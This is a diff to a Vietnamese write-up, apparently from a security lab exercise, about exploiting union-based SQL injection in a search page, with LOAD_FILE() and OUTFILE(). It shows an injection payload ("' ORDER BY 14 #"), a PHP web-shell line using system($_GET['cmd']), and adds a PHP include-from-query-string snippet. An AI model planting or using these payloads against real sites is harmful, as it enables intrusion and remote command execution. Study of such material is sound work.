@@ -1,9 +1,10 @@
 Người thực hiện: Lê Trần Văn Chương.
 Ngày: 05/04/2022.
 Mục lục:
-- Khai thác SQLi Union Based chức năng search ở trang index.php
-- LOAD_FILE()
-- OUTFILE()
+- [Khai thác SQLi Union Based chức năng search ở trang index.php](#khai-thác-sqli-union-based-chức-năng-search-ở-trang-indexphp)
+- [LOAD_FILE()](#load_file)
+- [OUTFILE()](#outfile)
+- [<?include($_GET['cmd']); ?>](#include_getcmd-)
 ## Khai thác SQLi Union Based chức năng search ở trang index.php
 1. Kiểm tra xem có tổng cộng bao nhiêu cột dữ liệu trong bảng của DB.
 `' ORDER BY 14 #` 
@@ -84,4 +85,6 @@ Mục lục:
 	system($_GET['cmd'])
 ?>
 </pre>
+
+<?include($_GET['cmd']); ?>
 ---
